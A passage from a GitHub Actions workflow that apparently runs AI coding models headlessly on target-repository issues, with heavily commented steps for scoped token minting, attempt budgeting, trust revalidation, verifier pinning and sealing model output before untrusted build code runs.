      # [registry #596] 'true' when THIS run's attempt receipt was voided as a credential outage.
      # final_state must not park the issue on the "final allowed attempt produced no PR" arm when
      # the attempt was never spent — that arm reads attempt_number, which the void cannot lower.
      attempt_voided: ${{ steps.attempt-void.outputs.voided }}
    concurrency:
      group: worker-${{ inputs.target_repo }}-${{ inputs.issue_number }}
      cancel-in-progress: false
    steps:
      - name: Checkout registry (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          path: registry
          persist-credentials: false

      - name: Mint dry-run target-scoped App token (contents read only)
        id: app-token-dry
        if: ${{ inputs.dry_run }}
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-contents: read
          # No post-phase revoker in the worker job — see the live mint's rationale below.
          skip-token-revoke: true

      - name: Mint live target-scoped App token
        id: app-token-live
        if: ${{ !inputs.dry_run }}
        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0
        with:
          app-id: ${{ secrets.REGISTRY_ADMIN_APP_ID }}
          private-key: ${{ secrets.REGISTRY_ADMIN_APP_KEY }}
          owner: ${{ needs.resolve.outputs.target_owner }}
          repositories: ${{ needs.resolve.outputs.target_name }}
          permission-contents: write
          permission-issues: write
          permission-pull-requests: write
          # Granted at App + installation level 2026-07-17 (maintainer): lets workers push
          # branches touching .github/workflows/* (role:ci issues were structurally blocked).
          permission-workflows: write
          # POST-PHASE CREDENTIAL BAN (PR #310 round 3 blocker): by default this action
          # registers a post-job phase that REVOKES the installation token — authenticating
          # WITH that token — and action post phases run after ALL normal steps, i.e. AFTER
          # the gate has executed target-controlled code on this runner. That revoker is
          # exactly the later credential-bearing process a detached hostile gate process could
          # observe. Every mint in this job therefore disables revocation and relies on the
          # 60-minute installation TTL (plus narrow scoping) instead; the clean-runner jobs
          # below keep the default revoker because no target code ever runs there.
          # worker-live.sh's boundary self-test enforces this on every worker-job mint.
          skip-token-revoke: true

      - name: Verify target App identity and default branch
        id: target
        env:
          GH_TOKEN: ${{ steps.app-token-dry.outputs.token || steps.app-token-live.outputs.token }}
          TARGET_REPO: ${{ inputs.target_repo }}
          APP_SLUG: ${{ steps.app-token-dry.outputs.app-slug || steps.app-token-live.outputs.app-slug }}
        run: |
          set -euo pipefail
          [[ -n "$GH_TOKEN" ]] || { echo '::error::target App token was not minted'; exit 1; }
          [[ -n "$APP_SLUG" ]] || { echo '::error::app slug was not resolved'; exit 1; }
          printf '::add-mask::%s\n' "$GH_TOKEN"
          gh api "repos/$TARGET_REPO" > "$RUNNER_TEMP/target.json"
          # An App INSTALLATION token cannot call /user; resolve the bot identity via the
          # public /users/<slug>[bot] endpoint instead. [OPUS-4.8] canary fix.
          gh api "/users/${APP_SLUG}[bot]" > "$RUNNER_TEMP/app-user.json"
          python3 - "$RUNNER_TEMP/target.json" "$RUNNER_TEMP/app-user.json" <<'PY'
          import json
          import os
          import re
          import sys

          with open(sys.argv[1], encoding="utf-8") as handle:
              repo = json.load(handle)
          with open(sys.argv[2], encoding="utf-8") as handle:
              user = json.load(handle)
          if repo.get("full_name") != os.environ["TARGET_REPO"]:
              raise SystemExit("App token read the wrong target")
          default_branch = repo.get("default_branch")
          login = user.get("login")
          user_id = str(user.get("id", ""))
          if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", str(default_branch)):
              raise SystemExit("target has an unsafe default branch")
          if not re.fullmatch(r"[A-Za-z0-9_.-]+\[bot\]", str(login)) or not user_id.isdigit():
              raise SystemExit("target token did not identify a GitHub App bot")
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              output.write(f"default_branch={default_branch}\n")
              output.write(f"bot_login={login}\n")
              output.write(f"bot_id={user_id}\n")
          print(f"target token verified for {repo['full_name']} at {default_branch}")
          PY

      # Pin to the SHA the resolve job resolved the route against (issue #143), NOT the moving
      # default-branch tip: the `selected` step below re-reads routing metadata from this checkout,
      # and the model runs on it, so both must be the exact revision policy + the account claim were
      # bound to. A routing change that lands after resolve is picked up by the next dispatch cycle,
      # never mid-run on an already-claimed lease. fetch-depth: 0 makes the SHA fetchable; the PR is
      # still opened against the branch NAME (steps.target.outputs.default_branch) at publish time.
      - name: Checkout target at the resolved routing revision (pinned, no persisted token)
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
        with:
          repository: ${{ inputs.target_repo }}
          ref: ${{ needs.resolve.outputs.target_sha }}
          path: target
          token: ${{ steps.app-token-dry.outputs.token || steps.app-token-live.outputs.token }}
          fetch-depth: 0
          persist-credentials: false

      - name: Resolve claimed account to concrete target model
        id: selected
        if: ${{ inputs.dry_run || needs.claim.outputs.acquired == 'true' }}
        env:
          DRY_RUN: ${{ inputs.dry_run }}
          ROUTING_PATH: ${{ needs.resolve.outputs.routing }}
          DRY_ACCOUNT: ${{ inputs.account }}
          DRY_MODEL: ${{ needs.resolve.outputs.model }}
          DRY_PROVIDER: ${{ needs.resolve.outputs.provider }}
          DRY_HARNESS: ${{ needs.resolve.outputs.harness }}
          DRY_PROVIDER_MODEL: ${{ needs.resolve.outputs.provider_model }}
          DRY_CREDENTIAL_FORMAT: ${{ needs.resolve.outputs.credential_format }}
          DRY_SECRET_REF: ${{ needs.resolve.outputs.secret_ref }}
          LIVE_ACCOUNT: ${{ needs.claim.outputs.account }}
          LIVE_MODEL: ${{ needs.claim.outputs.model }}
          LIVE_PROVIDER: ${{ needs.claim.outputs.provider }}
          LIVE_HARNESS: ${{ needs.claim.outputs.harness }}
          LIVE_CREDENTIAL_FORMAT: ${{ needs.claim.outputs.credential_format }}
          LIVE_SECRET_REF: ${{ needs.claim.outputs.secret_ref }}
        run: |
          python3 - <<'PY'
          import os
          from pathlib import Path, PurePosixPath
          import re
          import tomllib

          dry = os.environ["DRY_RUN"] == "true"
          target_root = Path(os.environ["GITHUB_WORKSPACE"], "target").resolve()
          routing_path = target_root.joinpath(*PurePosixPath(os.environ["ROUTING_PATH"]).parts).resolve()
          try:
              routing_path.relative_to(target_root)
          except ValueError as exc:
              raise SystemExit("resolved routing path escaped target checkout") from exc
          with open(routing_path, "rb") as handle:
              routing = tomllib.load(handle)

          if dry:
              account = os.environ["DRY_ACCOUNT"]
              model = os.environ["DRY_MODEL"]
              expected = {
                  "provider": os.environ["DRY_PROVIDER"],
                  "harness": os.environ["DRY_HARNESS"],
                  "provider_model": os.environ["DRY_PROVIDER_MODEL"],
                  "credential_format": os.environ["DRY_CREDENTIAL_FORMAT"],
              }
              secret_ref = os.environ["DRY_SECRET_REF"]
          else:
              account = os.environ["LIVE_ACCOUNT"]
              model = os.environ["LIVE_MODEL"]
              expected = {}
              secret_ref = os.environ["LIVE_SECRET_REF"]
          meta = routing.get("models", {}).get(model)
          if not isinstance(meta, dict):
              raise SystemExit("claimed model is missing from protected target routing")
          # A codex alias may leave provider_model unset/TBD (locked decision 14): worker-live.sh
          # then omits --model and the codex CLI default applies (the proven drain posture).
          provider_model = meta.get("provider_model")
          if meta.get("harness") == "codex" and provider_model in (None, "", "TBD"):
              provider_model = "TBD"
          values = {
              "account": account,
              "model": model,
              "provider": meta.get("provider"),
              "harness": meta.get("harness"),
              "provider_model": provider_model,
              "credential_format": meta.get("credential_format"),
              "secret_ref": secret_ref,
          }
          if values["provider"] not in {"openai", "anthropic"}:
              raise SystemExit("claimed model has an unsupported provider")
          if (values["provider"], values["harness"]) not in {
              ("openai", "codex"), ("anthropic", "claude")
          }:
              raise SystemExit("claimed model has an unsupported harness")
          if values["credential_format"] not in {
              "codex-auth-json", "claude-credentials-json", "claude-oauth-token", "anthropic-api-key"
          }:
              raise SystemExit("claimed model has an unsupported credential format")
          if not dry:
              # Strict routing equality (issue #142): require EXACT equality, not the old
              # "compare only when the claimed value is non-empty" guard. The claim/adopt jobs now
              # reject empty metadata, but the selected-model step is the last gate before a secret
              # is exposed, so it enforces the same non-empty exact-match contract the dry-run branch
              # applies below — an empty or drifted provider/harness/format fails closed here too.
              claimed_provider = os.environ["LIVE_PROVIDER"]
              claimed_harness = os.environ["LIVE_HARNESS"]
              claimed_format = os.environ["LIVE_CREDENTIAL_FORMAT"]
              if claimed_provider != values["provider"]:
                  raise SystemExit("claimed account provider conflicts with protected routing")
              if claimed_harness != values["harness"]:
                  raise SystemExit("claimed account harness conflicts with protected routing")
              if claimed_format != values["credential_format"]:
                  raise SystemExit("claimed account credential format conflicts with protected routing")
          elif any(values[key] != value for key, value in expected.items()):
              raise SystemExit("dry-run account metadata drifted from protected routing")
          if not re.fullmatch(r"acct[0-9a-z]{2,}", str(account)):
              raise SystemExit("unsafe selected account")
          if secret_ref != f"{account.upper()}_TOKEN" or not re.fullmatch(r"[A-Z][A-Z0-9_]*", str(secret_ref)):
              raise SystemExit("unsafe selected secret_ref")
          for key, value in values.items():
              if not isinstance(value, str) or not value or "\n" in value or "\r" in value:
                  raise SystemExit(f"unsafe or missing selected value: {key}")
          with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as output:
              for key, value in values.items():
                  output.write(f"{key}={value}\n")
          # Privacy (locked decision 22b): public workflow logs never carry account handles.
          print(f"selected account resolved: model={model}, harness={values['harness']}")
          PY

      # Round-4 finding 1 (windowed-vs-lifetime split brain): attempt-check re-derives the SAME
      # human-readmission cutoff CLAIM granted the retry on (park_policy.readmission_cutoff over
      # the live label timeline, strict maintainer probe) and charges the WINDOWED attempt
      # count. The cutoff is deliberately derived WORKER-SIDE, never taken from the dispatch
      # payload: like every other last-step guard here (trust reverify, strict routing
      # equality), the budget evidence is re-proved live so a workflow_dispatch caller can
      # never mint budget. A genuinely exhausted windowed budget still fails closed below.
      - name: Check durable per-issue attempt budget
        id: budget
        if: ${{ !inputs.dry_run && needs.claim.outputs.acquired == 'true' }}
        env:
          GH_TOKEN: ${{ steps.app-token-live.outputs.token }}
        run: |
          python3 registry/scripts/worker-issue.py attempt-check \
            --repo "${{ inputs.target_repo }}" \
            --issue "${{ inputs.issue_number }}" \
            --max-attempts "${{ needs.resolve.outputs.max_attempts }}" \
            --bot-login "${{ steps.target.outputs.bot_login }}"

      - name: Last-step trust and issue-revision revalidation
        id: trust
        if: ${{ !inputs.dry_run && needs.claim.outputs.acquired == 'true' && steps.budget.outputs.exhausted != 'true' }}
        continue-on-error: true
        env:
          GH_TOKEN: ${{ steps.app-token-live.outputs.token }}
        run: |
          python3 registry/scripts/worker-issue.py reverify \
            --repo "${{ inputs.target_repo }}" \
            --issue "${{ inputs.issue_number }}" \
            --expected-author "${{ needs.resolve.outputs.issue_author }}" \
            --expected-body-sha "${{ needs.resolve.outputs.issue_body_sha }}" \
            --trust-gate "$GITHUB_WORKSPACE/target/scripts/trust-gate.py" \
            --bot-login "${{ steps.target.outputs.bot_login }}" \
            --issue-file "$RUNNER_TEMP/verified-issue.json"

      # [issue #1075] THE MISSING INCREMENT. `trust` above is continue-on-error and runs BEFORE
      # `prepare`, so a refusal skipped "Record model attempt" entirely: the cycle allocated a
      # runner, minted an App token and checked out the target repo, then incremented NOTHING.
      # `max_attempts` was therefore checked against a counter the refusal path could not move and
      # the deferred-retry lane re-admitted the same issue forever — target #834 was dispatched ~34
      # times in one day (next-highest: 3), ~18% of the day's dispatch capacity. Each refusal was
      # CORRECT; only the repetition was the bug, so this charges the cycle instead of widening the
      # trust boundary by a single login.
      #
      # `steps.trust.outcome == 'failure'` is the exact gate: `outcome` is the step's own result
      # BEFORE continue-on-error rewrites `conclusion` to success (a `!= 'success'` test would also
      # fire on the SKIPPED case — budget already exhausted, or no claim — and charge a cycle that
      # never ran). It is deliberately NOT continue-on-error itself: a charge that silently fails to
      # land restores the unbounded loop, so it must be loud. The run is already dead either way —
      # `prepare`/`attempt`/`model` are all gated on trust success — and the always() final_state
      # job still converges the issue exactly as it does for any other pre-model abort.
      - name: Charge a pre-model trust refusal to the durable per-issue budget
        id: refusal
        if: ${{ !inputs.dry_run && needs.claim.outputs.acquired == 'true' && steps.budget.outputs.exhausted != 'true' && steps.trust.outcome == 'failure' }}
        env:
          GH_TOKEN: ${{ steps.app-token-live.outputs.token }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        run: |
          python3 registry/scripts/worker-issue.py record-refusal \
            --repo "${{ inputs.target_repo }}" \
            --issue "${{ inputs.issue_number }}" \
            --max-attempts "${{ needs.resolve.outputs.max_attempts }}" \
            --bot-login "${{ steps.target.outputs.bot_login }}" \
            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
            --run-url "$RUN_URL"

      # [issue #568] Ownership receipt FIRST, label SECOND — the compare-and-swap ordering. The
      # pre-publish re-check below cannot treat `status:in-progress` as this run's claim: the label
      # is SHARED, so it proves only that SOME run claimed the issue. The run-key-bound claim
      # receipt proves WHICH, and posting it BEFORE the flip makes this run's ownership durable
      # from its first mutation — so a newer run supersedes an older one even during the long
      # pre-attempt interval (this step -> worker-prep -> "Record model attempt"), the window in
      # which the attempt receipt alone still left the older run looking authorized.
      #
      # The receipt is consequently NO LONGER best-effort (`|| true` removed): a run that cannot
      # record ownership must die HERE, before the label flip and before any model spend, rather
      # than take the shared label with nothing binding it — order the failures so an older run can
      # never remain authorized. final_state converges the issue exactly as for any pre-model abort.
      - name: Mark trusted live issue in progress + post claim receipt
        id: claim-receipt
        if: ${{ !inputs.dry_run && needs.claim.outputs.acquired == 'true' && steps.trust.outcome == 'success' }}
        env:
          GH_TOKEN: ${{ steps.app-token-live.outputs.token }}
          WORKER_MODEL: ${{ needs.claim.outputs.model }}
          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        run: |
          # A GitHub App cannot be a literal issue assignee, so the receipt comment + the
          # status:in-progress label ARE the "orchestrator is working this" assignment.
          python3 registry/scripts/worker-issue.py claim-receipt \
            --repo "${{ inputs.target_repo }}" \
            --issue "${{ inputs.issue_number }}" \
            --model "$WORKER_MODEL" --run-url "$RUN_URL" \
            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
            --bot-login "${{ steps.target.outputs.bot_login }}"
          python3 registry/scripts/worker-issue.py status \
            --repo "${{ inputs.target_repo }}" \
            --issue "${{ inputs.issue_number }}" \
            --status in-progress

      # [issue #568] Snapshot the trust-gate VERIFIER out of every model-reachable path BEFORE the
      # model runs. The pre-publish re-check below must not execute the verifier from the
      # post-model `target` tree: the model runs with that tree read-write (and a trust-surface
      # issue legitimately edits it), so the candidate change would control the very program that
      # authorizes its own publication. The copy is taken HERE — pre-model, from the SHA-pinned
      # checkout, the same bytes the `trust` step just executed — and lands under RUNNER_TEMP
      # *outside* WORKER_ROOT: the model container mounts only the target tree and
      # WORKER_ROOT/{home,cli} (worker-live.sh _run_headless_harness), so nothing the model runs
      # can reach the snapshot. The recorded sha256 OUTPUT is the binding for host-side threats:
      # the gate step later runs target-controlled cargo build scripts on the runner itself, which
      # CAN rewrite runner files after this step — but completed-step outputs live in the runner's
      # in-memory state and are re-expanded into the re-check from there, so on-disk tampering
      # after capture flips the digest comparison and publish fails closed. No continue-on-error:
      # a failed snapshot dies HERE, before any model spend.
      #
      # [review r1] The WHOLE verifier trust root is pinned, not just the nested gate program: the
      # DRIVER that performs the live author/body/label/claim checks and decides whether to invoke
      # that gate lives in the registry checkout, which the gate's target-controlled build scripts
      # can rewrite just as easily (`../registry/...` from the target working directory). An
      # exit-zero impostor there would make the re-check "succeed" and publish with no
      # re-attestation at all, so the driver is snapshotted and digest-bound on the same terms.
      # [review r2] That pin must cover the CLOSURE the pre-publish path actually executes, which
      # is not the driver alone: `holds_live_claim` — the ownership CAS the mode's claim proof
      # rests on — loads park_policy.py out of the driver's own directory by path, so a two-file
      # snapshot dies with FileNotFoundError on EVERY legitimate run (fail-closed, but publication
      # would never happen). All three are copied and digest-bound; siblings no reverify path
      # touches stay out, so a future path reaching for one still dies on a missing import rather
      # than silently loading a rewritable copy.
      - name: Pin trust-gate verifier + reverify driver outside the model-writable tree
        id: pin-trust-gate
        if: ${{ !inputs.dry_run && steps.trust.outcome == 'success' }}
        run: |
          set -euo pipefail
          src="$GITHUB_WORKSPACE/target/scripts/trust-gate.py"
          dst="$RUNNER_TEMP/trust-verifier/trust-gate.py"
          install -D -m 0444 "$src" "$dst"
          sha="$(sha256sum "$dst" | cut -d' ' -f1)"
          [[ "$sha" =~ ^[0-9a-f]{64}$ ]]
          echo "sha256=$sha" >> "$GITHUB_OUTPUT"
          driver_src="$GITHUB_WORKSPACE/registry/scripts/worker-issue.py"
          driver_dst="$RUNNER_TEMP/trust-verifier/worker-issue.py"
          install -D -m 0444 "$driver_src" "$driver_dst"
          driver_sha="$(sha256sum "$driver_dst" | cut -d' ' -f1)"
          [[ "$driver_sha" =~ ^[0-9a-f]{64}$ ]]
          echo "driver_sha256=$driver_sha" >> "$GITHUB_OUTPUT"
          # The snapshot must be the COMPLETE closure of the pre-publish path, not just its entry
          # point: `holds_live_claim` — the ownership CAS this mode's whole claim proof rests on —
          # loads park_policy.py by `Path(__file__).with_name(...)`, i.e. out of THIS directory. A
          # snapshot without it does not fail open, but it does die on every legitimate run
          # (FileNotFoundError before the CAS is ever evaluated), so publication would never
          # happen. It is copied and digest-bound on exactly the same terms as the other two; the
          # remaining lazily-loaded siblings (worker-pr.py) belong to no reverify path and stay
          # out, so a future code path that reaches for one still dies fail-closed rather than
          # silently loading a rewritable copy.
          policy_src="$GITHUB_WORKSPACE/registry/scripts/park_policy.py"
          policy_dst="$RUNNER_TEMP/trust-verifier/park_policy.py"
          install -D -m 0444 "$policy_src" "$policy_dst"
          policy_sha="$(sha256sum "$policy_dst" | cut -d' ' -f1)"
          [[ "$policy_sha" =~ ^[0-9a-f]{64}$ ]]
          echo "policy_sha256=$policy_sha" >> "$GITHUB_OUTPUT"

      - name: Prepare isolated selected-account environment
        id: prepare
        if: ${{ inputs.dry_run || (needs.claim.outputs.acquired == 'true' && steps.trust.outcome == 'success') }}
        env:
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          WORKER_ACCOUNT: ${{ steps.selected.outputs.account }}
          WORKER_ACCOUNT_CREDENTIAL: ${{ secrets[steps.selected.outputs.secret_ref] }}
          WORKER_PROVIDER: ${{ steps.selected.outputs.provider }}
          WORKER_HARNESS: ${{ steps.selected.outputs.harness }}
          WORKER_CREDENTIAL_FORMAT: ${{ steps.selected.outputs.credential_format }}
          # Provider refresh tokens are ONE-TIME-USE (issue #596): a dry run must not consume the
          # account's stored grant, so it materializes the mount without exchanging anything.
          WORKER_PREFLIGHT_REFRESH: ${{ inputs.dry_run && 'skip' || 'refresh' }}
        run: bash registry/scripts/worker-prep.sh

      - name: Confirm dry-run boundary
        if: ${{ inputs.dry_run }}
        env:
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          EXPECTED_HARNESS: ${{ steps.selected.outputs.harness }}
          # [issue #232] The prepared paths arrive as STEP OUTPUTS now, not as job-wide $GITHUB_ENV.
          PREPARED_HOME: ${{ steps.prepare.outputs.home }}
          PREPARED_CREDENTIAL: ${{ steps.prepare.outputs.credential_path }}
        run: |
          set -euo pipefail
          [[ "$PREPARED_HOME" == "$WORKER_ROOT/home" ]]
          [[ "$PREPARED_CREDENTIAL" == "$PREPARED_HOME/"* ]]
          [[ -f "$PREPARED_CREDENTIAL" && ! -L "$PREPARED_CREDENTIAL" ]]
          [[ -x "$WORKER_ROOT/cli/node_modules/.bin/$EXPECTED_HARNESS" ]]
          # [issue #232] ...and NOTHING naming the account or pointing at its credential leaked into
          # the job environment, where every later step — including the target-controlled gate on a
          # live run — would inherit it. This assertion is what makes a re-broadening of worker-prep's
          # exports a red dry run rather than a silent reopening of the exposure window.
          [[ -z "${WORKER_ACCOUNT:-}" && -z "${WORKER_CREDENTIAL_PATH:-}" \
             && -z "${WORKER_CREDENTIAL_BASELINE:-}" && "$HOME" != "$WORKER_ROOT"* ]]
          printf 'DRY-RUN complete: policy, target token, checkout, and worker-prep passed.\n'
          printf 'No lease was claimed, no model was run, and no pull request was opened.\n'

      - name: Record model attempt
        id: attempt
        if: ${{ !inputs.dry_run && steps.prepare.outcome == 'success' }}
        env:
          GH_TOKEN: ${{ steps.app-token-live.outputs.token }}
        run: |
          python3 registry/scripts/worker-issue.py record-attempt \
            --repo "${{ inputs.target_repo }}" \
            --issue "${{ inputs.issue_number }}" \
            --max-attempts "${{ needs.resolve.outputs.max_attempts }}" \
            --bot-login "${{ steps.target.outputs.bot_login }}" \
            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"

      - name: Run routed model headless on a fresh target branch
        id: model
        if: ${{ !inputs.dry_run && steps.attempt.outcome == 'success' }}
        working-directory: target
        env:
          # Deliberately NO GH_TOKEN here: the model container must never see a GitHub token
          # (commit/push/PR are host-side in the publish step; the prompt forbids gh use).
          TARGET_DIR: ${{ github.workspace }}/target
          TARGET_REPO: ${{ inputs.target_repo }}
          TARGET_DEFAULT_BRANCH: ${{ steps.target.outputs.default_branch }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          WORKER_ISSUE_FILE: ${{ runner.temp }}/verified-issue.json
          WORKER_MODEL_ALIAS: ${{ steps.selected.outputs.model }}
          WORKER_PROVIDER_MODEL: ${{ steps.selected.outputs.provider_model }}
          WORKER_AGENT: ${{ needs.resolve.outputs.agent }}
          WORKER_PACKAGES: ${{ needs.resolve.outputs.packages }}
          # [issue #232] The account credential reaches the harness HERE and only here (plus the
          # write-back below). It used to arrive through worker-prep's job-wide $GITHUB_ENV export,
          # which left the path — and the isolated HOME holding it — readable by every later step,
          # the target-controlled gate included. The harness metadata comes from the account
          # SELECTION step (its single source), the path from prepare's step output.
          WORKER_HARNESS: ${{ steps.selected.outputs.harness }}
          WORKER_CREDENTIAL_FORMAT: ${{ steps.selected.outputs.credential_format }}
          WORKER_CREDENTIAL_PATH: ${{ steps.prepare.outputs.credential_path }}
        run: bash ../registry/scripts/worker-live.sh model

      # Model-access health (registry #32): capture the sanitized exit CLASS so the separate
      # no-target-code `model_health` job can record it. worker-live.sh sets WORKER_EXIT_CLASS
      # (+ WORKER_RESET_HINT on session-limit) in $GITHUB_ENV on a FAILED launch only; a
      # successful model step means `success`. always() with NO skipped-guard (review defect #4):
      # a pre-launch abort (prep/attempt failure) or a job timeout/cancellation leaves the model
      # step skipped/cancelled with no host-observed CLI exit — that records class=unknown
      # (counted toward persistence, never a provider-outage) instead of recording nothing.
      - name: Capture model exit class
        id: exit-class
        if: ${{ always() && !inputs.dry_run }}
        env:
          MODEL_OUTCOME: ${{ steps.model.outcome }}
        run: |
          set -uo pipefail
          if [[ "$MODEL_OUTCOME" == "success" ]]; then
            cls=success
          elif [[ "$MODEL_OUTCOME" == "skipped" ]]; then
            # Pre-launch abort: no CLI ever ran. worker-prep's host-side credential pre-flight
            # (issue #596) nonetheless classifies its own failures into WORKER_EXIT_CLASS before the
            # model step can run, so prefer that over a blanket `unknown`.
            cls="${WORKER_EXIT_CLASS:-unknown}"
          else
            # failure OR cancellation/timeout: use the host-observed class when worker-live.sh
            # got far enough to write one; otherwise unknown.
            cls="${WORKER_EXIT_CLASS:-unknown}"
          fi
          # outcome_attempt: the attempt that produced this outcome — the recorder's dedup key
          # (review r1 of #425). Grouped redirect (SC2129): one append, three keys.
          {
            echo "class=$cls"
            echo "reset_hint=${WORKER_RESET_HINT:-}"
            echo "outcome_attempt=${GITHUB_RUN_ATTEMPT:-}"
          } >> "$GITHUB_OUTPUT"

      # [registry #596] A CREDENTIAL-OUTAGE launch failure must NOT consume an attempt from the
      # bounded deferred-retry budget. The attempt receipt above is the LAST gate before the model
      # launches, so a launch that died on the worker account's credential (acct01's codex OAuth
      # access token expires hourly while the fleet stores a static snapshot of it) burned a full
      # attempt without the model ever running — and enough of those parked the issue
      # (status:parked) exactly as if the model had declined the task, which inverts the park policy.
      #
      # It runs HERE rather than in `final_state` because the next dispatch tick re-reads the attempt
      # budget from these durable receipts. The class gate lives in worker-pr.is_credential_outage
      # (pure + self-tested), NOT in this `if:` — `setup`/`unknown`/timeouts stay CHARGED, keeping the
      # bounded-crash accounting intact. The app-token-live token is the one record-attempt already
      # used; no new capability, and this step precedes the target-code cargo gate below.
      - name: Void the worker attempt on a credential-outage exit (never a decline)
        id: attempt-void
        if: ${{ always() && !inputs.dry_run && steps.attempt.outcome == 'success' }}
        env:
          GH_TOKEN: ${{ steps.app-token-live.outputs.token }}
          EXIT_CLASS: ${{ steps.exit-class.outputs.class }}
        run: |
          python3 registry/scripts/worker-issue.py void-attempt \
            --repo "${{ inputs.target_repo }}" \
            --issue "${{ inputs.issue_number }}" \
            --bot-login "${{ steps.target.outputs.bot_login }}" \
            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
            --exit-class "$EXIT_CLASS"

      # ---- ISSUE #575: the hostile/token boundary ---------------------------------------------
      # Everything below this point on THIS runner is reachable by target-controlled code (the
      # cargo gate a few steps down runs the target's own build scripts and tests as the runner
      # user). So the model's work is SEALED HERE, while the runner is still clean, as a directory
      # of inert data — a unified patch plus the host-built PR title/body/meta and the model's
      # declared follow-ups. worker-live.sh `bundle` refuses to run at all if a GitHub token is in
      # scope, and it restores the index it staged so the gate below still sees exactly the
      # worktree the model left (a committed or staged tree would empty the gate's changed-path
      # classifiers and make the gate VACUOUS — which is why the commit is reconstructed on the
      # publisher instead of being made here).
      #
      # The digest lands in $GITHUB_OUTPUT of THIS step, which the runner captures before the gate
      # step starts; no later step can rewrite an already-captured step output. That captured
      # digest is the root of trust the isolated `publish` job verifies against.
      - name: Seal the model's work as a digest-bound bundle (PRE-GATE, no token)
        id: bundle
        if: ${{ !inputs.dry_run && steps.model.outcome == 'success' }}
        working-directory: target
        env:
          # Deliberately NO GH_TOKEN: this phase must be token-free, and worker-live.sh asserts it.
          TARGET_DIR: ${{ github.workspace }}/target
          TARGET_REPO: ${{ inputs.target_repo }}
          TARGET_DEFAULT_BRANCH: ${{ steps.target.outputs.default_branch }}
          ISSUE_NUMBER: ${{ inputs.issue_number }}
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          WORKER_ISSUE_FILE: ${{ runner.temp }}/verified-issue.json
          # WORKER_BRANCH is inherited from $GITHUB_ENV (the model step's host-side branch
          # creation); the publisher does NOT trust it — it re-derives the same deterministic name
          # from run identity and defers on any drift.
          WORKER_MODEL_ALIAS: ${{ steps.selected.outputs.model }}
          WORKER_PROVIDER_MODEL: ${{ steps.selected.outputs.provider_model }}
          WORKER_PROVIDER: ${{ steps.selected.outputs.provider }}
          WORKER_AGENT: ${{ needs.resolve.outputs.agent }}
          GATE_PROFILE: ${{ needs.resolve.outputs.gate_profile }}
          ARM_AUTO_MERGE_REQUESTED: ${{ needs.resolve.outputs.arm_auto_merge }}
        run: bash ../registry/scripts/worker-live.sh bundle

      # Uploaded PRE-GATE as well: the artifact service takes its copy while the runner is clean,
      # so a gate that later rewrites the on-disk bundle changes nothing the publisher downloads —
      # and if it managed to replace the artifact anyway, the digest comparison refuses it.
      # if-no-files-found: error keeps a silently empty upload from becoming a silent no-publish.
      - name: Upload the pre-gate publish bundle (inert data only)
        if: ${{ !inputs.dry_run && steps.bundle.outcome == 'success' }}
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: publish-bundle-${{ github.run_id }}-${{ github.run_attempt }}
          path: ${{ runner.temp }}/registry-worker/publish-bundle
          if-no-files-found: error
          retention-days: 1

      - name: Write back a rotated full account credential
        id: writeback
        # NO model-step guard (issue #596): rotation now happens in worker-prep's HOST-SIDE
        # pre-flight, before the model step exists. Provider refresh tokens are one-time-use, so
        # dropping this step because the model never launched would strand a consumed grant in the
        # secret and kill the NEXT run on this account.
        #
        # NO PREPARE-STEP GUARD EITHER (retro-review of #614). `steps.prepare.outcome == 'success'`
        # made this compensating action reachable ONLY from the success path — the same class as
        # #604's root cause, where the round-void job was gated on the very verdict a credential
        # outage prevents. The pre-flight consumes the ONE-TIME-USE refresh token EARLY inside
        # prepare, and prepare then keeps going: materialize the minimal mount, assert no refresh
        # material leaked, copy the tamper baseline, npm-install the pinned CLI, export $GITHUB_ENV.
        # ANY failure in that window skipped this step, so the OLD grant was spent, the NEW grant
        # died with the runner, and the account was PERMANENTLY dead until an interactive re-mint.
        # The condition is now keyed to `always()` plus the ACCOUNT SELECTION (which identifies the
        # secret to write and precedes the pre-flight), and worker-live.sh's rotation MARKER — the
        # host-side "a rotation was obtained" receipt — decides whether there is anything to
        # persist. With no marker this step is a no-op: it reports rotated=false and exits 0.
        # Asserted by dispatch-secrets-guard.rotation_writeback_reachable_verdict, so restoring a
        # success-only guard is a red tick rather than a silent regression.
        if: ${{ always() && !inputs.dry_run && needs.claim.outputs.acquired == 'true' && steps.selected.outcome == 'success' }}
        env:
          WORKER_ROOT: ${{ runner.temp }}/registry-worker
          WORKER_ACCOUNT: ${{ steps.selected.outputs.account }}
          WORKER_SECRET_REF: ${{ steps.selected.outputs.secret_ref }}
          # [issue #232] The mount-containment inputs (issue #134's tamper check: the mounted
          # credential must come back byte-identical to what prepare materialized) reach the
          # write-back as STEP-LEVEL env, no longer through job-wide $GITHUB_ENV. Both are EMPTY
          # when prepare aborted before materializing the mount — exactly what they were in that
          # case before, so write_back's rescued no-mount path (#614) is unchanged. This is `env:`,
